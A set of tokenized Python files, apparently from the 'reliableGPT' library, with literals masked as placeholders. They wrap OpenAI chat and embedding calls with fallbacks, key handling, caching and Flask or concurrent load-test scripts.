<s> from flask import Flask <EOL> import time <EOL> import openai <EOL> import sys <EOL> import traceback <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> import os <EOL> openai . api_key = os . getenv ( '<STR_LIT>' ) <EOL> def logging_fn ( * args , ** kwargs ) : <EOL> pass <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , <EOL> caching = True , <EOL> user_email = [ "<STR_LIT>" ] , <EOL> max_threads = <NUM_LIT> , verbose = True ) <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def test_fn ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> try : <EOL> result = openai . ChatCompletion . create ( model = "<STR_LIT>" , messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ] ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> except : <EOL> traceback . print_exc ( ) <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def index ( ) : <EOL> return '<STR_LIT>' <EOL> if __name__ == "<STR_LIT>" : <EOL> from waitress import serve <EOL> serve ( app , host = "<STR_LIT>" , port = <NUM_LIT> , threads = <NUM_LIT> ) <EOL> </s>
<s> from flask import Flask <EOL> import time <EOL> import openai <EOL> import sys <EOL> import traceback <EOL> import dotenv <EOL> import random <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> import os <EOL> openai . api_key = os . getenv ( '<STR_LIT>' ) <EOL> def logging_fn ( * args , ** kwargs ) : <EOL> pass <EOL> app = Flask ( __name__ ) <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , app = app , <EOL> user_email = [ "<STR_LIT>" ] , verbose = True ) <EOL> def throw_random_error ( ) : <EOL> if random . random ( ) < <NUM_LIT> : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def test_fn ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> throw_random_error ( ) <EOL> result = openai . ChatCompletion . create ( model = "<STR_LIT>" , messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ] ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def index ( ) : <EOL> return '<STR_LIT>' <EOL> if __name__ == "<STR_LIT>" : <EOL> from waitress import serve <EOL> serve ( app , host = "<STR_LIT>" , port = <NUM_LIT> , threads = <NUM_LIT> ) <EOL> </s>
<s> import requests <EOL> import concurrent . futures <EOL> import time <EOL> url = "<STR_LIT>" <EOL> params = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> queries = [ ] <EOL> for i in range ( <NUM_LIT> ) : <EOL> query = f"<STR_LIT>" <EOL> queries . append ( query ) <EOL> def make_request ( query ) : <EOL> params [ "<STR_LIT>" ] = query <EOL> print ( f"<STR_LIT>" ) <EOL> response = requests . get ( url , params = params ) <EOL> print ( response ) <EOL> return response . text <EOL> start_time = time . time ( ) <EOL> with concurrent . futures . ThreadPoolExecutor ( max_workers = <NUM_LIT> ) as executor : <EOL> futures = [ executor . submit ( make_request , query ) for query in queries ] <EOL> concurrent . futures . wait ( futures ) <EOL> results = [ future . result ( ) for future in futures ] <EOL> end_time = time . time ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> import sys <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import os <EOL> import traceback <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> from KeyManagement import reliableKey <EOL> import openai <EOL> reliableKey . token = "<STR_LIT>" <EOL> openai . api_key = reliableKey . get_key ( "<STR_LIT>" , os . getenv ( "<STR_LIT>" ) ) <EOL> openai . error . AuthenticationError = reliableKey . AuthenticationError <EOL> questions = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> for question in questions : <EOL> try : <EOL> chat_completion = openai . ChatCompletion . create ( model = "<STR_LIT>" , messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : question } ] ) <EOL> print ( chat_completion ) <EOL> except : <EOL> traceback . print_exc ( ) <EOL> continue <EOL> </s>
<s> import requests <EOL> import concurrent . futures <EOL> import time <EOL> import traceback <EOL> url = "<STR_LIT>" <EOL> params = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> queries = [ ] <EOL> for i in range ( <NUM_LIT> ) : <EOL> query = f"<STR_LIT>" <EOL> queries . append ( query ) <EOL> embeddings = [ ] <EOL> def make_request ( query ) : <EOL> try : <EOL> params [ "<STR_LIT>" ] = query <EOL> response = requests . get ( url , params = params ) <EOL> embeddings . append ( response ) <EOL> return response . text <EOL> except : <EOL> print ( f"<STR_LIT>" ) <EOL> start_time = time . time ( ) <EOL> with concurrent . futures . ThreadPoolExecutor ( max_workers = <NUM_LIT> ) as executor : <EOL> futures = [ executor . submit ( make_request , query ) for query in queries ] <EOL> concurrent . futures . wait ( futures ) <EOL> results = [ future . result ( ) for future in futures ] <EOL> end_time = time . time ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> import sys <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> import openai <EOL> from reliablegpt import reliableGPT <EOL> import os <EOL> import time <EOL> good_open_ai_api_key = os . getenv ( '<STR_LIT>' ) <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , <EOL> user_email = "<STR_LIT>" , <EOL> user_token = "<STR_LIT>" , <EOL> queue_requests = True , <EOL> fallback_strategy = [ "<STR_LIT>" ] ) <EOL> def test_single_call_bad_key ( ) : <EOL> openai . api_key = "<STR_LIT>" <EOL> model = "<STR_LIT>" <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ] <EOL> temperature = <NUM_LIT> <EOL> error_count = <NUM_LIT> <EOL> failure_count = <NUM_LIT> <EOL> try : <EOL> print ( "<STR_LIT>" ) <EOL> response = openai . ChatCompletion . create ( model = model , <EOL> messages = messages , <EOL> temperature = temperature ) <EOL> if response and "<STR_LIT>" in response : <EOL> error_count += <NUM_LIT> <EOL> if response == "<STR_LIT>" : <EOL> failure_count += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( "<STR_LIT>" , e ) <EOL> error_count += <NUM_LIT> <EOL> print ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> if error_count == <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> print ( test_single_call_bad_key ( ) ) <EOL> def test_embedding_bad_key ( ) : <EOL> openai . Embedding . create = reliableGPT ( <EOL> openai . Embedding . create , <EOL> user_email = "<STR_LIT>" , <EOL> user_token = '<STR_LIT>' , <EOL> send_notification = True ) <EOL> openai . api_key = "<STR_LIT>" <EOL> def get_embedding ( text , model = "<STR_LIT>" ) : <EOL> text = text . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> return openai . Embedding . create ( input = [ text ] , <EOL> model = model ) [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> result = get_embedding ( "<STR_LIT>" ) <EOL> test_embedding_bad_key ( ) <EOL> list_questions = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" <EOL> ] <EOL> def simple_openai_call ( prompt ) : <EOL> print ( f"<STR_LIT>" ) <EOL> model = "<STR_LIT>" <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : prompt <EOL> } , <EOL> ] <EOL> result = openai . ChatCompletion . create ( model = model , messages = messages ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> simple_openai_call ( "<STR_LIT>" ) <EOL> def test_regular_q ( ) : <EOL> openai . api_key = good_open_ai_api_key <EOL> results = { } <EOL> start_time = time . time ( ) <EOL> for question in list_questions [ : <NUM_LIT> ] : <EOL> print ( "<STR_LIT>" ) <EOL> print ( question ) <EOL> result = simple_openai_call ( question ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( result ) <EOL> results [ question ] = result <EOL> print ( "<STR_LIT>" ) <EOL> print ( results ) <EOL> print ( len ( results ) ) <EOL> end_time = time . time ( ) <EOL> print ( "<STR_LIT>" , end_time - start_time ) <EOL> test_regular_q ( ) <EOL> </s>
<s> from . main import * <EOL> from . CacheDecorator import * <EOL> </s>
<s> import asyncio <EOL> import os <EOL> import sys <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> from main import reliableGPT <EOL> import openai <EOL> openai . api_key = os . getenv ( "<STR_LIT>" ) <EOL> openai . api_type = "<STR_LIT>" <EOL> openai . api_base = os . getenv ( "<STR_LIT>" ) <EOL> openai . api_version = "<STR_LIT>" <EOL> print ( f"<STR_LIT>" ) <EOL> openai . ChatCompletion . acreate = reliableGPT ( <EOL> openai . ChatCompletion . acreate , _test = True , <EOL> user_email = "<STR_LIT>" , azure_fallback_strategy = [ "<STR_LIT>" ] , verbose = True ) <EOL> async def create_chat_completion ( ) : <EOL> chat_completion_resp = await openai . ChatCompletion . acreate ( engine = "<STR_LIT>" , model = "<STR_LIT>" , messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ] ) <EOL> print ( chat_completion_resp ) <EOL> async def call_create_chat_completion ( ) : <EOL> for _ in range ( <NUM_LIT> ) : <EOL> await create_chat_completion ( ) <EOL> asyncio . run ( call_create_chat_completion ( ) ) <EOL> </s>
<s> import sys <EOL> import os <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> import concurrent . futures <EOL> openai . api_type = "<STR_LIT>" <EOL> openai . api_base = os . getenv ( "<STR_LIT>" ) <EOL> openai . api_version = "<STR_LIT>" <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , <EOL> user_email = "<STR_LIT>" , <EOL> azure_fallback_strategy = [ "<STR_LIT>" ] , _test = True , verbose = True ) <EOL> def simple_openai_call ( prompt ) : <EOL> print ( f"<STR_LIT>" ) <EOL> engine = "<STR_LIT>" <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : prompt <EOL> } , <EOL> ] <EOL> result = openai . ChatCompletion . create ( engine = engine , messages = messages ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> list_questions = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> openai . api_key = os . getenv ( "<STR_LIT>" ) <EOL> for question in list_questions : <EOL> response = simple_openai_call ( question ) <EOL> print ( response ) <EOL> </s>
<s> from flask import Flask <EOL> import time <EOL> import openai <EOL> import sys <EOL> import traceback <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> import os <EOL> openai . api_type = "<STR_LIT>" <EOL> openai . api_base = os . getenv ( "<STR_LIT>" ) <EOL> openai . api_version = "<STR_LIT>" <EOL> openai . api_key = os . getenv ( "<STR_LIT>" ) <EOL> def logging_fn ( * args , ** kwargs ) : <EOL> pass <EOL> openai . Embedding . create = reliableGPT ( <EOL> openai . Embedding . create , <EOL> user_email = "<STR_LIT>" , <EOL> backup_openai_key = os . getenv ( '<STR_LIT>' ) ) <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def test_fn ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> try : <EOL> text_string = "<STR_LIT>" * <NUM_LIT> <EOL> embeddings = openai . Embedding . create ( engine = "<STR_LIT>" , <EOL> input = text_string ) [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> return embeddings <EOL> except : <EOL> traceback . print_exc ( ) <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def index ( ) : <EOL> return '<STR_LIT>' <EOL> if __name__ == "<STR_LIT>" : <EOL> from waitress import serve <EOL> serve ( app , host = "<STR_LIT>" , port = <NUM_LIT> , threads = <NUM_LIT> ) <EOL> </s>
<s> import sys <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> print ( reliableGPT ( openai . ChatCompletion . create , user_email = "<STR_LIT>" ) ) <EOL> </s>
<s> import sys <EOL> import os <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> import concurrent . futures <EOL> openai . api_type = "<STR_LIT>" <EOL> openai . api_base = os . getenv ( "<STR_LIT>" ) <EOL> openai . api_version = "<STR_LIT>" <EOL> openai . api_key = os . getenv ( "<STR_LIT>" ) <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , <EOL> user_email = "<STR_LIT>" , <EOL> backup_openai_key = os . getenv ( "<STR_LIT>" ) , _test = True , verbose = True ) <EOL> openai . Embedding . create = reliableGPT ( <EOL> openai . Embedding . create , <EOL> user_email = "<STR_LIT>" , <EOL> backup_openai_key = os . getenv ( '<STR_LIT>' ) , <EOL> verbose = True ) <EOL> def simple_openai_call ( prompt ) : <EOL> print ( f"<STR_LIT>" ) <EOL> engine = "<STR_LIT>" <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : prompt <EOL> } , <EOL> ] <EOL> result = openai . ChatCompletion . create ( engine = engine , messages = messages ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> response = simple_openai_call ( "<STR_LIT>" ) <EOL> print ( response ) <EOL> text_string = "<STR_LIT>" <EOL> embeddings = openai . Embedding . create ( deployment_id = "<STR_LIT>" , <EOL> input = text_string ) <EOL> </s>
<s> from setuptools import setup , find_packages <EOL> setup ( <EOL> name = '<STR_LIT>' , <EOL> version = '<STR_LIT>' , <EOL> description = '<STR_LIT>' , <EOL> author = '<STR_LIT>' , <EOL> packages = [ <EOL> '<STR_LIT>' <EOL> ] , <EOL> install_requires = [ <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' <EOL> ] , <EOL> ) <EOL> </s>
<s> from typing import Any <EOL> import threading <EOL> from threading import active_count <EOL> import requests <EOL> import traceback <EOL> from flask import Flask , request <EOL> class reliableCache : <EOL> def __init__ ( self , query_arg = None , customer_instance_arg = None , user_email = None , max_threads = <NUM_LIT> ) -> None : <EOL> self . max_threads = max_threads <EOL> self . verbose = True <EOL> self . query_arg = query_arg <EOL> self . customer_instance_arg = customer_instance_arg <EOL> self . user_email = user_email <EOL> self . cache_wrapper_threads = { } <EOL> self . hot_cache = { } <EOL> pass <EOL> def print_verbose ( self , print_statement ) : <EOL> if self . verbose : <EOL> print ( "<STR_LIT>" + str ( print_statement ) ) <EOL> def add_cache ( self , user_email , instance_id , input_prompt , response ) : <EOL> try : <EOL> url = "<STR_LIT>" <EOL> querystring = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : instance_id , <EOL> "<STR_LIT>" : user_email , <EOL> "<STR_LIT>" : input_prompt , <EOL> "<STR_LIT>" : response <EOL> } <EOL> response = requests . post ( url , params = querystring ) <EOL> except : <EOL> pass <EOL> def try_cache_request ( self , user_email , instance_id , query = None ) : <EOL> try : <EOL> if ( user_email , instance_id , query ) in self . hot_cache : <EOL> result = self . hot_cache [ ( user_email , instance_id , query ) ] <EOL> return result <EOL> else : <EOL> url = "<STR_LIT>" <EOL> querystring = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : instance_id , <EOL> "<STR_LIT>" : user_email , <EOL> "<STR_LIT>" : query , <EOL> } <EOL> response = requests . get ( url , params = querystring ) <EOL> extracted_result = response . json ( ) [ "<STR_LIT>" ] <EOL> self . hot_cache [ ( user_email , instance_id , query ) ] = extracted_result <EOL> return extracted_result <EOL> except : <EOL> pass <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> return None <EOL> def cache_wrapper ( self , func ) : <EOL> def wrapper ( * args , ** kwargs ) : <EOL> query = request . args . get ( self . query_arg ) <EOL> instance_id = request . args . get ( self . customer_instance_arg ) <EOL> curr_thread_id = threading . get_ident ( ) <EOL> self . cache_wrapper_threads [ curr_thread_id ] = True <EOL> try : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> thread_utilization = self . get_wrapper_thread_utilization ( ) <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> if thread_utilization > <NUM_LIT> : <EOL> result = self . try_cache_request ( user_email = self . user_email , instance_id = instance_id , query = query ) <EOL> if result != None : <EOL> self . cache_wrapper_threads [ curr_thread_id ] = False <EOL> return result <EOL> result = func ( * args , ** kwargs ) <EOL> thread = threading . Thread ( target = self . add_cache , args = ( self . user_email , instance_id , query , result ) ) <EOL> thread . start ( ) <EOL> pass <EOL> except : <EOL> traceback . print_exc ( ) <EOL> pass <EOL> finally : <EOL> self . cache_wrapper_threads [ curr_thread_id ] = False <EOL> return result <EOL> return wrapper <EOL> def get_wrapper_thread_utilization ( self ) : <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> active_cache_threads = <NUM_LIT> <EOL> for value in self . cache_wrapper_threads . values ( ) : <EOL> if value == True : <EOL> active_cache_threads += <NUM_LIT> <EOL> self . print_verbose ( f"<STR_LIT>" ) <EOL> return active_cache_threads / self . max_threads <EOL> </s>
<s> import sys <EOL> import os <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import openai <EOL> from main import reliableGPT <EOL> import concurrent . futures <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , <EOL> user_email = "<STR_LIT>" , verbose = True ) <EOL> print ( openai . ChatCompletion . create ) <EOL> good_open_ai_api_key = os . getenv ( '<STR_LIT>' ) <EOL> def test_single_call_bad_key ( ) : <EOL> openai . api_key = "<STR_LIT>" <EOL> model = "<STR_LIT>" <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ] <EOL> temperature = <NUM_LIT> <EOL> error_count = <NUM_LIT> <EOL> failure_count = <NUM_LIT> <EOL> try : <EOL> print ( "<STR_LIT>" ) <EOL> response = openai . ChatCompletion . create ( model = model , <EOL> messages = messages , <EOL> temperature = temperature ) <EOL> print ( "<STR_LIT>" , response ) <EOL> if response and "<STR_LIT>" in response : <EOL> error_count += <NUM_LIT> <EOL> if response == "<STR_LIT>" : <EOL> failure_count += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( "<STR_LIT>" , e ) <EOL> error_count += <NUM_LIT> <EOL> print ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> if error_count == <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> def test_embedding_bad_key ( ) : <EOL> openai . Embedding . create = reliableGPT ( <EOL> openai . Embedding . create , <EOL> user_email = "<STR_LIT>" , <EOL> user_token = '<STR_LIT>' , <EOL> send_notification = True ) <EOL> openai . api_key = "<STR_LIT>" <EOL> def get_embedding ( text , model = "<STR_LIT>" ) : <EOL> text = text . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> return openai . Embedding . create ( input = [ text ] , <EOL> model = model ) [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> result = get_embedding ( "<STR_LIT>" ) <EOL> print ( result ) <EOL> def test_embedding_bad_key_fail ( ) : <EOL> openai . Embedding . create = reliableGPT ( <EOL> openai . Embedding . create , <EOL> user_email = "<STR_LIT>" , <EOL> send_notification = True ) <EOL> openai . api_key = "<STR_LIT>" <EOL> def get_embedding ( text , model = "<STR_LIT>" ) : <EOL> text = text . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> return openai . Embedding . create ( input = [ text ] , <EOL> model = model ) [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] <EOL> result = get_embedding ( "<STR_LIT>" ) <EOL> print ( result ) <EOL> def test_bad_open_ai_call ( ) : <EOL> model = "<STR_LIT>" <EOL> openai . api_key = good_open_ai_api_key <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ] <EOL> result = openai . ChatCompletion . create ( model = model , messages = messages ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> test_bad_open_ai_call ( ) <EOL> def test_bad_open_ai_call_with_q ( ) : <EOL> openai . ChatCompletion . create = reliableGPT ( <EOL> openai . ChatCompletion . create , <EOL> user_email = "<STR_LIT>" , <EOL> fallback_strategy = [ "<STR_LIT>" , "<STR_LIT>" ] , <EOL> queue_requests = True ) <EOL> model = "<STR_LIT>" <EOL> openai . api_key = good_open_ai_api_key <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ] <EOL> result = openai . ChatCompletion . create ( model = model , messages = messages ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> def test_multiple_calls ( ) : <EOL> model = "<STR_LIT>" <EOL> openai . api_key = good_open_ai_api_key <EOL> messages = [ { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" * <NUM_LIT> <EOL> } , { <EOL> "<STR_LIT>" : <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" : <EOL> "<STR_LIT>" <EOL> } , { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } ] <EOL> temperature = <NUM_LIT> <EOL> error_count = <NUM_LIT> <EOL> failure_count = <NUM_LIT> <EOL> def call_reliable_openai ( ) : <EOL> nonlocal error_count , failure_count <EOL> try : <EOL> print ( "<STR_LIT>" ) <EOL> response = openai . ChatCompletion . create ( model = model , <EOL> messages = messages , <EOL> temperature = temperature ) <EOL> print ( response ) <EOL> if response and "<STR_LIT>" in response : <EOL> error_count += <NUM_LIT> <EOL> if response == "<STR_LIT>" : <EOL> failure_count += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( "<STR_LIT>" , e ) <EOL> error_count += <NUM_LIT> <EOL> with concurrent . futures . ThreadPoolExecutor ( max_workers = <NUM_LIT> ) as executor : <EOL> future_calls = [ executor . submit ( call_reliable_openai ) for _ in range ( <NUM_LIT> ) ] <EOL> concurrent . futures . wait ( future_calls ) <EOL> print ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> if error_count == <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> import sys <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> import os <EOL> import dotenv <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> import openai <EOL> from Model import Model <EOL> openai . api_key = os . getenv ( '<STR_LIT>' ) <EOL> obj = Model ( openai . ChatCompletion . create ) <EOL> create_completion = obj . get_original_completion ( ) <EOL> print ( create_completion ( model = "<STR_LIT>" , prompt = "<STR_LIT>" ) ) <EOL> </s>
<s> from flask import Flask , request <EOL> import time <EOL> import openai <EOL> import sys <EOL> import traceback <EOL> import dotenv <EOL> import vecs <EOL> from dotenv import load_dotenv <EOL> load_dotenv ( ) <EOL> sys . path . append ( '<STR_LIT>' ) <EOL> from CacheDecorator import reliableCache <EOL> import openai <EOL> from main import reliableGPT <EOL> import os <EOL> openai . api_key = os . getenv ( '<STR_LIT>' ) <EOL> DB_CONNECTION = os . getenv ( "<STR_LIT>" ) <EOL> vx = vecs . create_client ( DB_CONNECTION ) <EOL> vectorstore = vx . get_collection ( name = "<STR_LIT>" ) <EOL> cache = reliableCache ( max_threads = <NUM_LIT> , query_arg = "<STR_LIT>" , customer_instance_arg = "<STR_LIT>" , user_email = "<STR_LIT>" ) <EOL> def logging_fn ( * args , ** kwargs ) : <EOL> pass <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ cache . cache_wrapper <EOL> def test_fn ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> try : <EOL> question = request . args . get ( "<STR_LIT>" ) <EOL> query_embedding = openai . Embedding . create ( model = "<STR_LIT>" , <EOL> input = question ) [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> response = vectorstore . query ( <EOL> query_vector = query_embedding , <EOL> limit = <NUM_LIT> , <EOL> include_value = True , <EOL> include_metadata = True , <EOL> ) <EOL> input_prompt = <EOL> result = openai . ChatCompletion . create ( model = "<STR_LIT>" , messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : input_prompt } ] ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> except : <EOL> traceback . print_exc ( ) <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def index ( ) : <EOL> return '<STR_LIT>' <EOL> if __name__ == "<STR_LIT>" : <EOL> from waitress import serve <EOL> serve ( app , host = "<STR_LIT>" , port = <NUM_LIT> , threads = <NUM_LIT> ) <EOL> </s>
<s> import requests <EOL> import concurrent . futures <EOL> import time <EOL> url = "<STR_LIT>" <EOL> queries = [ ] <EOL> for i in range ( <NUM_LIT> ) : <EOL> query = f"<STR_LIT>" <EOL> queries . append ( query ) <EOL> def make_request ( query ) : <EOL> print ( f"<STR_LIT>" ) <EOL> response = requests . get ( url ) <EOL> print ( response ) <EOL> return response . text <EOL> start_time = time . time ( ) <EOL> with concurrent . futures . ThreadPoolExecutor ( max_workers = <NUM_LIT> ) as executor : <EOL> futures = [ executor . submit ( make_request , query ) for query in queries ] <EOL> concurrent . futures . wait ( futures ) <EOL> results = [ future . result ( ) for future in futures ] <EOL> end_time = time . time ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> import openai <EOL> import copy <EOL> class Model : <EOL> def __init__ ( self , model_function ) : <EOL> self . model_function = model_function <EOL> self . original_openai_chat = openai . ChatCompletion . create <EOL> self . original_openai_completion = openai . Completion . create <EOL> self . original_openai_embeddings = openai . Embedding . create <EOL> self . backup_model = None <EOL> def get_model_function ( self ) : <EOL> return self . model_function <EOL> def get_original_chat ( self ) : <EOL> return self . original_openai_chat <EOL> def get_original_completion ( self ) : <EOL> return self . original_openai_completion <EOL> def get_original_embeddings ( self ) : <EOL> return self . original_openai_embeddings <EOL> def get_original_api_base ( self ) : <EOL> return self . original_api_base <EOL> def get_original_api_version ( self ) : <EOL> return self . original_api_version <EOL> def set_openai_model ( self , model , api_key ) : <EOL> self . backup_model = model . __dict__ . copy ( ) <EOL> model . api_type = "<STR_LIT>" <EOL> model . api_base = "<STR_LIT>" <EOL> model . api_version = None <EOL> model . api_key = api_key <EOL> return model <EOL> def reset_model ( self ) : <EOL> return self . backup_model <EOL> </s>
